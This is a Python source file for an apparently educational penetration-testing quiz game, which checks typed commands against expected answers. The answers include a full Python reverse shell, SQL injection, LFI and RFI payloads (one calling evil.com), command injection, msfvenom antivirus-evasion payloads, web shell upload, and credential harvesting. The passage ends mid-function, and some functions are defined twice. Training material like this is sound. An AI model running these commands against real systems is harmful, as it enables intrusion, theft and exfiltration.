
from colorama import Fore, Back, Style, init
import time
import inspect
import os

# Initialize colorama
init()

# Declare current_level as global 
current_level = 0  # Declare at the top of your script

# Function to display the title screen
def display_title_screen():
    print(Fore.CYAN + "========================================================================")
    print("       WELCOME TO 'TRY HARDER': The Penetration Testing Simulation      ")
    print("========================================================================" + Style.RESET_ALL)
    print("Created by: milosilo")
    print("Twitter: @milosilo_hacks")
    print("https://github.com/milosilo")
    print(Fore.CYAN + "========================================================================" + Style.RESET_ALL)

def title_screen():
    global points
    global save_point
    print("Current Host:", current_level)
    print("Points:", points)
    print(Fore.CYAN + "========================================================================" + Style.RESET_ALL)
    choice = input("Type 'reset' to reset the game or press Enter to continue: ")
    if choice == "reset":
        reset_game()

# Function to simulate a host (level)
def host_one():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 1: Vulnerable Web Server" + Style.RESET_ALL)
        print("You are connected to a Kali Linux machine. Your first task is to find your network address.")
        print(Fore.YELLOW + "Hint: Use a command that shows network interfaces." + Style.RESET_ALL)
        cmd = "ifconfig"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd:
            print(Fore.GREEN + "Output: inet 192.168.1.100  netmask 255.255.255.0" + Style.RESET_ALL)
            print("Great! Now proceed to scan the target host.")
            print(Fore.YELLOW + "Hint: Use a popular network scanning tool to scan IP 192.168.1.1." + Style.RESET_ALL)
            cmd = "nmap -sS 192.168.1.1"
            user_input = input("kali@try-harder:~$ ")
            if user_input.strip() == cmd:
                print(Fore.GREEN + "Scan Output: 1 open port - 80/tcp open" + Style.RESET_ALL)
                points += 1
                break
            else:
                print(Fore.RED + "Try Harder" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Function to simulate host 2
def host_two():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 2: Exposed Database Server" + Style.RESET_ALL)
        print("Your task is to enumerate the database server with port 22 open.")
        print(Fore.YELLOW + "Hint: Use a brute-force tool against the user 'root' and IP 192.168.1.2." + Style.RESET_ALL)
        cmd = "hydra -l root -P wordlist.txt 192.168.1.2 ssh"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd:
            print(Fore.GREEN + "Brute-force Output: Password found for user 'root'" + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

def host_three():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 3: DNS Server" + Style.RESET_ALL)
        print("Your task is to enumerate DNS records.")
        print(Fore.YELLOW + "Hint: Use a DNS enumeration tool against IP 192.168.1.3." + Style.RESET_ALL)
        cmd = "dnsrecon -d 192.168.1.3"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd:
            print(Fore.GREEN + "DNS Output: Found subdomains: sub1, sub2" + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

def host_four():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)   
    while True:
        print(Fore.GREEN + "Host 4: Privilege Escalation on Linux" + Style.RESET_ALL)
        print("Your task is to escalate your privileges on a Linux machine.")
        print(Fore.YELLOW + "Hint: Use a common privilege escalation enumeration command to gather information." + Style.RESET_ALL)
        cmd = "sudo -l"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd:
            print(Fore.GREEN + "Output: User may run the following commands: (ALL) NOPASSWD: /usr/bin/vim" + Style.RESET_ALL)
            print("Great! Now exploit the privilege escalation.")
            print(Fore.YELLOW + "Hint: Use the information gathered to escalate your privileges." + Style.RESET_ALL)
            cmd = "sudo vim -c ':!/bin/bash'"
            user_input = input("kali@try-harder:~$ ")
            if user_input.strip() == cmd:
                print(Fore.GREEN + "You have successfully escalated your privileges!" + Style.RESET_ALL)
                points += 1
                break
            else:
                print(Fore.RED + "Try Harder" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 5: Windows Enumeration
def host_five():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 5: Windows Enumeration" + Style.RESET_ALL)
        print("Your task is to enumerate a Windows machine.")
        print(Fore.YELLOW + "Hint: Use a Windows enumeration tool against IP 192.168.1.5." + Style.RESET_ALL)
        cmd = "nbtscan 192.168.1.5"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd:
            print(Fore.GREEN + "Output: Found open SMB shares." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 6: Web Application Exploits
def host_six():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 6: Web Application Exploits" + Style.RESET_ALL)
        print("Your task is to exploit a vulnerability in a web application.")
        print(Fore.YELLOW + "Hint: Use a SQL injection payload on the login page." + Style.RESET_ALL)
        cmd = "' OR '1'='1"
        user_input = input("Enter SQL injection payload: ")
        if user_input.strip() == cmd:
            print(Fore.GREEN + "You have successfully exploited the web application!" + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 7: Buffer Overflow Exploitation
def host_seven():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 7: Buffer Overflow Exploitation" + Style.RESET_ALL)
        print("Your task is to exploit a buffer overflow vulnerability.")
        print(Fore.YELLOW + "Hint: Use a specific pattern of 200 to identify the overflow." + Style.RESET_ALL)
        cmd = "pattern_create.rb 200"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd:
            print(Fore.GREEN + "You have successfully created a unique pattern!" + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

#Host 5: Eyewitness web enumeration
def host_five():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 5: Using Eyewitness for Web Enumeration" + Style.RESET_ALL)
        print("Your task is to use Eyewitness to enumerate web servers.")
        print(Fore.YELLOW + "Hint: Use Eyewitness against the target web servers list named target.txt." + Style.RESET_ALL)
        cmd = "eyewitness --web target.txt"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd:
            print(Fore.GREEN + "Output: Screenshots and report generated!" + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 6: Lateral Movement Techniques
def host_six():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 6: Lateral Movement Techniques" + Style.RESET_ALL)
        print("Your task is to perform lateral movement to another system.")
        print(Fore.YELLOW + "Hint: Use psexec.py for lateral movement to gain administrator access on windows host 192.168.1.6." + Style.RESET_ALL)
        cmd = "psexec.py administrator@192.168.1.6"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd:
            print(Fore.GREEN + "You have successfully moved laterally!" + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 7: Modifying & Using an Exploit from Searchsploit
def host_seven():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 7: Modifying & Using an Exploit from Searchsploit" + Style.RESET_ALL)
        print("Your task is to find an exploit on a host running apache using Searchsploit.")
        print(Fore.YELLOW + "Hint: Find an exploit for apache 2.2." + Style.RESET_ALL)
        cmd = "searchsploit apache 2.2"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd:
            print(Fore.GREEN + "You have successfully found an exploit!" + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 8: Linux File Permissions Exploitation
def host_eight():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 8: Linux File Permissions Exploitation" + Style.RESET_ALL)
        print("Your task is to exploit file permissions on a Linux machine.")
        print(Fore.YELLOW + "Hint: First, list the files in the /secret directory." + Style.RESET_ALL)
        cmd1 = "ls /secret"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: -rw-rw-rw- 1 root root 12 Jan 20 12:34 secret.txt" + Style.RESET_ALL)
            print("Great! Now read the content of the file.")
            cmd2 = "cat /secret/secret.txt"
            user_input = input("kali@try-harder:~$ ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "You have successfully exploited the file permissions!" + Style.RESET_ALL)
                points += 1
                break
            else:
                print(Fore.RED + "Try Harder" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 9: SSH Key Exploitation
def host_nine():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 9: SSH Key Exploitation" + Style.RESET_ALL)
        print("Your task is to exploit an SSH key.")
        print(Fore.YELLOW + "Hint: Enumerate the home directory to find SSH keys." + Style.RESET_ALL)
        cmd1 = "ls ~/.ssh"
        user_input = input("root@host_nine:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: id_rsa" + Style.RESET_ALL)
            print("Now, use the SSH key to log into the target machine.")
            cmd2 = "ssh -i ~/.ssh/id_rsa kali@192.168.1.9"
            user_input = input("root@host_nine:~$ ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "You have successfully exploited the SSH key!" + Style.RESET_ALL)
                points += 1
                break
            else:
                print(Fore.RED + "Try Harder" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 10: Web Shell Upload and Execution
def host_ten():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 10: Web Shell Upload and Execution" + Style.RESET_ALL)
        print("Your task is to upload and execute a web shell for target http://192.168.1.10/upload.php.")
        print(Fore.YELLOW + "Hint: Use a web vulnerability scanner to find file upload functionality." + Style.RESET_ALL)
        cmd1 = "nikto -h http://192.168.1.10/upload.php"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: File upload functionality found." + Style.RESET_ALL)
            print("Now, upload the web shell.")
            cmd2 = "curl -F 'file=@web-shell.php' http://192.168.1.10/upload.php"
            user_input = input("kali@try-harder:~$ ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "You have successfully uploaded and executed the web shell!" + Style.RESET_ALL)
                points += 1
                break
            else:
                print(Fore.RED + "Try Harder" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 11: Password Cracking
def host_eleven():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 11: Password Cracking" + Style.RESET_ALL)
        print("Your task is to crack a password hash saved as hash.txt.")
        print(Fore.YELLOW + "Hint: Use a hash cracking tool using wordlist.txt." + Style.RESET_ALL)
        cmd1 = "john --wordlist=wordlist.txt hash.txt"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Password cracked: 123456" + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 12: Firewall Evasion
def host_twelve():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 12: Firewall Evasion" + Style.RESET_ALL)
        print("Your task is to find bypass on a firewall at 192.168.1.12.")
        print(Fore.YELLOW + "Hint: Use an evasion technique for enumeration to scan the target." + Style.RESET_ALL)
        cmd1 = "nmap -sS -f 192.168.1.12"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Firewall bypass discovered. Ports found open." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 13: Reverse Shell Exploitation
def host_thirteen():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 13: Reverse Shell Exploitation" + Style.RESET_ALL)
        print("Your task is to exploit a machine using a reverse shell.")
        print(Fore.YELLOW + "Hint: First, set up a listener on port 4444." + Style.RESET_ALL)
        cmd1 = "nc -lvnp 4444"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Listener set up on port 4444." + Style.RESET_ALL)
            print("Now, enter the python reverse shell payload to send to the target machine.")
            print("python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"192.168.1.13\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
            cmd2 = "python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"192.168.1.13\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
            user_input = input("kali@try-harder:~$ ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "Reverse shell established!" + Style.RESET_ALL)
                points += 1
                break
            else:
                print(Fore.RED + "Try Harder" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 14: Privilege Escalation on Windows
def host_fourteen():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 14: Privilege Escalation on Windows" + Style.RESET_ALL)
        print("Your task is to escalate your privileges on a Windows machine.")
        print(Fore.YELLOW + "Hint: First, check for unquoted service paths." + Style.RESET_ALL)
        cmd1 = "wmic service get name,displayname,pathname"
        user_input = input("C:\\Users\\User> ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Unquoted service path found named unquotedsvc using sc." + Style.RESET_ALL)
            print("Now, exploit the unquoted service path using exploit 'C:\\evil.exe'.")
            cmd2 = "sc config unquotedsvc binPath= C:\\evil.exe"
            user_input = input("C:\\Users\\User> ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "You have successfully escalated your privileges on the Windows machine!" + Style.RESET_ALL)
                points += 1
                break
            else:
                print(Fore.RED + "Try Harder" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 15: Active Directory Enumeration
def host_fifteen():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 15: Active Directory Enumeration" + Style.RESET_ALL)
        print("Your task is to enumerate an Active Directory environment milosilo.com via host 192.168.1.15.")
        print(Fore.YELLOW + "Hint: Use an LDAP enumeration tool." + Style.RESET_ALL)
        cmd1 = "ldapsearch -x -h 192.168.1.15 -b \"dc=milosilo,dc=com\""
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Users and Groups enumerated." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 16: Data Exfiltration
def host_sixteen():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 16: Data Exfiltration" + Style.RESET_ALL)
        print("Your task is to exfiltrate data from a target machine.")
        print(Fore.YELLOW + "Hint: First, identify sensitive data on the machine located in conf files." + Style.RESET_ALL)
        cmd1 = "find / -name '*.conf' 2>/dev/null"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Sensitive configuration file found: /usr/milo/web.conf" + Style.RESET_ALL)
            print("Now, use SCP to copy the files from 192.168.1.16 to /usr/kali")
            cmd2 = "scp user@192.168.1.16:/usr/milo/web.conf /usr/kali/web.conf"
            user_input = input("kali@try-harder:~$ ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "Data successfully exfiltrated!" + Style.RESET_ALL)
                points += 1
                break
            else:
                print(Fore.RED + "Try Harder" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 17: Wireless Network Cracking
def host_seventeen():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 17: Wireless Network Cracking" + Style.RESET_ALL)
        print("Your task is to crack a WPA2 wireless network using wlan0.")
        print(Fore.YELLOW + "Hint: Capture the WPA handshake first." + Style.RESET_ALL)
        cmd1 = "airodump-ng wlan0"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: WPA handshake captured and saved as capture.cap." + Style.RESET_ALL)
            print("Now, use aircrack-ng to crack the password using wordlist.txt.")
            cmd2 = "aircrack-ng -w wordlist.txt -b SSID capture.cap"
            user_input = input("kali@try-harder:~$ ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "WPA2 password cracked!" + Style.RESET_ALL)
                points += 1
                break
            else:
                print(Fore.RED + "Try Harder" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 18: SQL Injection with Manual Exploitation
def host_eighteen():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 18: SQL Injection with Manual Exploitation" + Style.RESET_ALL)
        print("Your task is to manually exploit a UNION SQL injection vulnerability.")
        print(Fore.YELLOW + "Hint: Enumerate the database first." + Style.RESET_ALL)
        cmd1 = "' UNION SELECT null, database() -- "
        user_input = input("Enter SQL Injection payload: ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Database name retrieved: union_station" + Style.RESET_ALL)
            print("Now, enumerate the tables.")
            cmd2 = "' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema='union_station' -- "
            user_input = input("Enter SQL Injection payload: ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "Tables successfully enumerated!" + Style.RESET_ALL)
                points += 1
                break
            else:
                print(Fore.RED + "Try Harder" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 19: Local File Inclusion (LFI)
def host_nineteen():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 19: Local File Inclusion (LFI)" + Style.RESET_ALL)
        print("Your task is to exploit a Local File Inclusion vulnerability from url that begins with 'page='")
        print(Fore.YELLOW + "Hint: Read the /etc/passwd file." + Style.RESET_ALL)
        cmd1 = "page=../../../../../etc/passwd"
        user_input = input("Enter LFI payload: ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: /etc/passwd file read successfully." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 20: Remote File Inclusion (RFI)
def host_twenty():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 20: Remote File Inclusion (RFI)" + Style.RESET_ALL)
        print("Your task is to exploit a Remote File Inclusion vulnerability from url that begins with 'page='")
        print(Fore.YELLOW + "Hint: Include a remote file to execute arbitrary code located at 'http://evil.com/shell.php'" + Style.RESET_ALL)
        cmd1 = "page=http://evil.com/shell.php"
        user_input = input("Enter RFI payload: ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Remote file included. Code executed!" + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 21: OS Command Injection
def host_twenty_one():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 21: OS Command Injection" + Style.RESET_ALL)
        print("Your task is to perform an OS command injection attack on host 192.168.1.21")
        print(Fore.YELLOW + "Hint: Use the ping functionality to perform the attack." + Style.RESET_ALL)
        cmd1 = "192.168.1.21; ls"
        user_input = input("Enter the IP address to ping: ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Command executed successfully." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 22: Metasploit Framework Exploitation
def host_twenty_two():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 22: Metasploit Framework Exploitation" + Style.RESET_ALL)
        print("Your task is to exploit a vulnerable machine using Metasploit.")
        print(Fore.YELLOW + "Hint: Use msfconsole to search for an appropriate exploit." + Style.RESET_ALL)
        cmd1 = "search type:exploit"
        user_input = input("msf6 > ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Exploit found named: exploit/multi/handler" + Style.RESET_ALL)
            print("Now, set the exploit with payload windows/meterpreter/reverse_tcp, and run it in a single line chained command. Your host is 192.168.1.22")
            cmd2 = "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.22; run"
            user_input = input("msf6 > ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "Exploit successful. Meterpreter session opened!" + Style.RESET_ALL)
                points += 1
                break
            else:
                print(Fore.RED + "Try Harder" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 23: Bypassing Antivirus
def host_twenty_three():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 23: Bypassing Antivirus" + Style.RESET_ALL)
        print("Your task is to bypass an antivirus solution.")
        print(Fore.YELLOW + "Hint: Use a tool to obfuscate a known malicious file." + Style.RESET_ALL)
        print(Fore.YELLOW + "Hint: windows/meterpreter/reverse_tcp LHOST=192.168.1.23 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 15 -o payload.exe" + Style.RESET_ALL)
        cmd1 = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.23 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 15 -o payload.exe"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: File obfuscated and saved as payload.exe" + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 24: Post-Exploitation Data Harvesting
def host_twenty_four():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 24: Post-Exploitation Data Harvesting" + Style.RESET_ALL)
        print("Your task is to collect sensitive data post-exploitation.")
        print(Fore.YELLOW + "Hint: Harvest browser passwords using a run command to a tool located here: post/windows/gather/." + Style.RESET_ALL)
        cmd1 = "run post/windows/gather/enum_chrome"
        user_input = input("meterpreter > ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Chrome passwords harvested." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 25: IOT Device Exploitation
def host_twenty_five():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 25: IOT Device Exploitation" + Style.RESET_ALL)
        print("Your task is to exploit an IOT device at IP 192.168.1.25.")
        print(Fore.YELLOW + "Hint: Enumerate the device for open ports first." + Style.RESET_ALL)
        cmd1 = "nmap -sS 192.168.1.25"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Open ports found." + Style.RESET_ALL)
            print("Now, exploit the device.")
            cmd2 = "python3 iot_exploit.py 192.168.1.25"
            user_input = input("kali@try-harder:~$ ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "IOT device successfully exploited!" + Style.RESET_ALL)
                points += 1
                break
            else:
                print(Fore.RED + "Try Harder" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 26: Web Shell Upload and Execution
def host_twenty_six():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 26: Web Shell Upload and Execution" + Style.RESET_ALL)
        print("Your task is to upload and execute a web shell.")
        print(Fore.YELLOW + "Hint: Use a file upload vulnerability to upload your web shell." + Style.RESET_ALL)
        cmd1 = "curl -F 'file=@webshell.php' http://192.168.1.26/upload.php"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Web shell uploaded successfully." + Style.RESET_ALL)
            print("Now, navigate to the uploaded web shell and execute a command.")
            cmd2 = "curl http://192.168.1.26/uploads/webshell.php?cmd=id"
            user_input = input("kali@try-harder:~$ ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)" + Style.RESET_ALL)
                points += 1
                break
            else:
                print(Fore.RED + "Try Harder" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 27: Bypassing 2FA
def host_twenty_seven():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 27: Bypassing 2FA" + Style.RESET_ALL)
        print("Your task is to bypass a 2-Factor Authentication system.")
        print(Fore.YELLOW + "Hint: Use a phishing attack to capture the 2FA code." + Style.RESET_ALL)
        cmd1 = "python3 2fa_phish.py"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: 2FA code captured!" + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 28: Packet Sniffing and Analysis
def host_twenty_eight():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 28: Packet Sniffing and Analysis" + Style.RESET_ALL)
        print("Your task is to capture and analyze network packets.")
        print(Fore.YELLOW + "Hint: Use a packet sniffing tool to capture traffic." + Style.RESET_ALL)
        cmd1 = "tcpdump -i eth0 -w capture.pcap"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Packets captured and saved to capture.pcap." + Style.RESET_ALL)
            print("Now, analyze the capture to find sensitive data.")
            cmd2 = "strings capture.pcap | grep 'password'"
            user_input = input("kali@try-harder:~$ ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "Output: Sensitive data found!" + Style.RESET_ALL)
                points += 1
                break
            else:
                print(Fore.RED + "Try Harder" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 29: SSH Tunneling for Port Forwarding
def host_twenty_nine():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 29: SSH Tunneling for Port Forwarding" + Style.RESET_ALL)
        print("Your task is to tunnel through SSH to forward a port.")
        print(Fore.YELLOW + "Hint: Use SSH port forwarding to access a restricted service." + Style.RESET_ALL)
        cmd1 = "ssh -L 8080:localhost:80 user@192.168.1.29"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Port forwarded successfully." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 30: Kernel Exploitation
def host_thirty():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 30: Kernel Exploitation" + Style.RESET_ALL)
        print("Your task is to exploit a kernel vulnerability.")
        print(Fore.YELLOW + "Hint: Use a public exploit for a known kernel vulnerability." + Style.RESET_ALL)
        cmd1 = "gcc -o exploit exploit.c"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Exploit compiled." + Style.RESET_ALL)
            print("Now, run the exploit.")
            cmd2 = "./exploit"
            user_input = input("kali@try-harder:~$ ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "Kernel successfully exploited! You have root access now." + Style.RESET_ALL)
                points += 1
                break
            else:
                print(Fore.RED + "Try Harder" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 31: Buffer Overflow Exploitation
def host_thirty_one():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 31: Buffer Overflow Exploitation" + Style.RESET_ALL)
        print("Your task is to exploit a buffer overflow vulnerability.")
        print(Fore.YELLOW + "Hint: Use a fuzzing tool to identify the overflow point." + Style.RESET_ALL)
        cmd1 = "python3 bof_fuzzer.py"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Overflow point identified at 128 bytes." + Style.RESET_ALL)
            print("Now, create a payload using msfvenom.")
            cmd2 = "msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.31 LPORT=4444 -f python"
            user_input = input("kali@try-harder:~$ ")
            if user_input.strip() == cmd2:
                print(Fore.GREEN + "Output: Payload generated successfully." + Style.RESET_ALL)
                points += 1
                break
            else:
                print(Fore.RED + "Try Harder" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 32: Social Engineering & Impersonation
def host_thirty_two():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 32: Social Engineering & Impersonation" + Style.RESET_ALL)
